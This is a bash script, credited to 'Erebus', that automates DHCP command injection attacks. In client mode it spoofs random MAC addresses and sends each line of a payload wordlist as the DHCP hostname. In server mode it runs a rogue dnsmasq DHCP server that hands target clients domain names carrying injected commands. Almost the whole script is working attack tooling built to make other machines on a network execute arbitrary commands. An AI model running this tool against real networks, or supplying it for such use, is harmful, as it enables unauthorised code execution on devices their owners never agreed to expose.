#!/bin/bash
# DHCP Hostname / Domain-name Command Injection
# Author: Erebus
# Version: v1.0
# Last update: 2019/1/1

trap CTRL_C SIGINT

usage()
{
    echo "DHCP Hostname / Domain-name Command Injection"
    echo "Usage: $0 (-c|-s) [[-p WORDLIST] [OPTION...] | [-h]]"
    echo "  -h, --help              Display this help menu"
    echo "  -c, --client            Attack as a client (Hostname Command Injection)"
    echo "  -s, --server            Attack as a server (Domain-name Command Injection)"
    echo "  -p, --payload WORDLIST  The file with commands you want to inject (default: cmd.txt / only used with -s enabled)"
    echo "  -i, --interface NIC     The network interface your target server/client is on (default: eth0)"
    echo "  -g, --gateway GATEWAY   IP address of the gateway your server's going to use (default: 10.0.0.1)"
    echo "  -n, --number ASSIGNED   How many IPs you want to assign at a time (default: 1 / only used with -s enabled)"
    echo "Prerequisites:"
    echo "  Dnsmasq installed with config file \"dnsmasq.conf\" located in /etc"
    echo "  Tested on Kali Linux 2018"
}


CTRL_C() {
    printf "\nSIGINT caught..."
    echo "End all running services"
    if [[ $option = "server" ]]; then
        service dnsmasq stop 
    fi
    echo DONE
    exit
}


HOST_CMD_INJ()
{
    # Read each line in the payload file
    # IFS='' (or IFS=):     prevents leading/trailing whitespace from being trimmed.
    # -r:                   prevents backslash escapes from being interpreted.
    # || [[ -n $line ]]:    prevents the last line from being ignored
    #                       if it doesn't end with a \n (since read returns a non-zero exit code when it encounters EOF).
    while IFS='' read -r line || [[ -n "$line" ]]; do
        # Release the IP address
        sudo dhclient -r $NIC
        # Change the MAC address everytime before requesting new IP
        sudo macchanger -r $NIC > /dev/null 2>&1
        echo =========================================================================
        # Start inserting payload into the host-name
        echo Trying $line
        sudo sed -i "s~^send host-name.*~send host-name = \"$line\";~g" /etc/dhcp/dhclient.conf
        # Request for IP address
        sudo dhclient $NIC
        # Wait 3 seconds to continue
        echo -n .; sleep 1; echo -n .; sleep 1; echo .; sleep 1
    done < "$payload"
}


DOMAIN_CMD_INJ()
{
    # Enable the interface and assign Gateway/DNS server IP address / Assigned IP range
    sudo ifconfig $NIC up
    sudo ifconfig $NIC $GW/24
    # IP address of the DNS server is set the same as Gateway's by default
    sudo sed -i "s/^interface=.*/interface=$NIC/g" /etc/dnsmasq.conf
    sudo sed -i "s/^dhcp-option=3.*/dhcp-option=3, $GW/g" /etc/dnsmasq.conf
    sudo sed -i "s/^dhcp-option=6.*/dhcp-option=6, $GW/g" /etc/dnsmasq.conf
    domain=`echo "${GW%.*}"`
    # DHCP range is defined to 10-20 by default
    sudo sed -i "s/^dhcp-range=.*/dhcp-range=$domain.10,$domain.20,5m/g" /etc/dnsmasq.conf
    lastline=$(cat $payload | tail -n1)
    # Read each line in the payload file
    while IFS='' read -r line || [[ -n $line ]]; do
        echo Trying $line
        sudo sed -i "s~^domain.*~domain=$line~g" /etc/dnsmasq.conf
        # Clear up the old DHCP leases
        > /var/lib/misc/dnsmasq.leases
        # Start the DHCP server
        sudo service dnsmasq start
        echo "Press p to pause, n to skip this one"
        # Check if DHCP server offered an IP / IPs
        while ! [ $(wc -l < /var/lib/misc/dnsmasq.leases) -ge $ASSIGNED ]; do
            echo -n .
            read -t1 -r -s -n1 KEY < /dev/tty
            # NO key was pressed
            if [[ -z "$KEY" ]];then
                continue
            elif [[ "$KEY" == 'p' ]]; then
                echo Paused.
                sudo service dnsmasq stop
                echo Press any key to continue...
                read -r -s -n1 < /dev/tty
                echo Continue...
                sudo service dnsmasq start
            elif [[ "$KEY" == 'n' ]]; then
                break
            fi
        done
        echo
        if [[ -s /var/lib/misc/dnsmasq.leases ]]; then
            echo Show IP lease information
            cat /var/lib/misc/dnsmasq.leases
        fi
        sudo service dnsmasq stop
        if [[ "$line" == "$lastline" ]]; then
            echo DONE
            exit 0
        fi
        echo =========================================================================
        echo "Please release the target's IP or restart it if the IP cannot be released manually..."
        read -p "Press [Enter] to continue" < /dev/tty
    done < "$payload"
}


# Default value of the parameters
payload="cmd.txt"
option=
NIC="eth0"
GW="10.0.0.1"
ASSIGNED=1

# At least one argument is needed (-c | -s)
if [[ $# -lt 1 ]]; then
    usage
    exit 1
fi

while [ "$1" != "" ]; do
    case $1 in
        # -c and -s cannot be assigned at a time
        -c | --client )         if [[ "$option" != "" ]]; then
                                    usage
                                    exit 1
                                else
                                    option="client"
                                fi
                                ;;
        -s | --server )         if [[ "$option" != "" ]]; then
                                    usage
                                    exit 1
                                else
                                    option="server"
                                fi
                                ;;
        -i | --interface )      shift
                                if [[ ! -d "/sys/class/net/$1" ]]; then
                                    echo "Interface \"$1\" not exist!"
                                    exit 1
                                fi
                                NIC=$1
                                ;;
        -p | --payload )        shift
                                if [[ ! -f $1 ]]; then
                                    echo "File \"$1\" not found!"
                                    exit 1
                                fi
                                payload=$1
                                ;;
        -g | --gateway )        shift
                                GW=$1
                                ;;
        -n | --number )         shift
                                ASSIGNED=$1
                                ;;
        -h | --help )           usage
                                exit
                                ;;
        * )                     usage
                                exit 1
    esac
    shift
done

# Check if the wordlist exist
if [[ ! -f $payload ]]; then
    echo "File \"$payload\" not found! Create one or assign the WORDLIST with [-p | --payload WORDLIST]"
    exit 1
fi

if [[ $option = "client" ]]; then
    HOST_CMD_INJ
elif [[ $option = "server" ]]; then
    DOMAIN_CMD_INJ
else
    usage
    exit 1
fi
